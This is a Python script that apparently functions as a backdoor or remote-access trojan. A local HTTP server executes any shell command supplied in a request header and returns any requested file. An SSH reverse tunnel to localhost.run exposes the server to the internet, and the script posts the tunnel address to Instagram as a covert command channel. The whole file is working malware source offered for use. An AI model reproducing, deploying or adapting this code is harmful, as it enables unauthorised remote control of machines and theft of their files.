from http.server import BaseHTTPRequestHandler, HTTPServer
from instagrapi import Client
from instagrapi.types import StoryMention, StoryMedia, StoryLink, StoryHashtag
import requests
import threading
import time
import subprocess
import os

HOST = '127.0.0.1'
PORT = 8080


class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        request_headers = self.headers
        command = request_headers['command']
        if command[:3] == 'cd ':
            os.chdir(command[3:])
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
        elif command[:8] == 'download':
            f = open(command[9:], 'rb')
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(f.read())
            f.close()
        else:
            CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(CMD.stdout.read())
            self.wfile.write(CMD.stderr.read())


def upload(cap):
    print('[*] Attempting Upload')
    USERNAME = ''#add instagram username here
    PASSWORD = ''#add instagram password here
    client = Client()
    photo = requests.get('https://imgix.ranker.com/list_img_v2/6528/2606528/original/the-best-hackers-characters')#change image to whatever you want by adding its link here
    with open('test.jpeg', 'wb') as test:
        test.write(photo.content)
        test.close()
    try:
        client.login(USERNAME, PASSWORD)
        print("Uploading " + str(cap))
        client.photo_upload('test.jpeg', caption=cap, extra_data={"custom_accessibility_caption": cap})
        print('[+] Upload Successful')
    except Exception as e:
        print(e)
        os.remove('test.jpeg')
        time.sleep(60)
        upload(cap)
    finally:
        os.remove('test.jpeg')


def Tunnel():
    value = 0
    tunnel = subprocess.Popen("ssh -R 80:127.0.0.1:8080 localhost.run",stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True, encoding='utf-8', errors='replace')
    while True:
        realtime_output = tunnel.stdout.readline().strip()
        if realtime_output == '' and tunnel.poll() is not None:
            pass
        elif realtime_output and value > 14:
            upload(realtime_output)
            value += 1
        elif realtime_output and value != 14:
            value += 1
        elif realtime_output and value == 14:
            upload(realtime_output)
            value += 1
            
def main():
    threading.Thread(target=Tunnel, daemon=True).start()
    try:
        server = HTTPServer((HOST, PORT), MyHandler)
        print("[*] Server started on " + HOST)
        server.serve_forever()

    except KeyboardInterrupt:
        print('[!] Server is terminated')
        server.server_close()

if __name__ == '__main__':
    main()
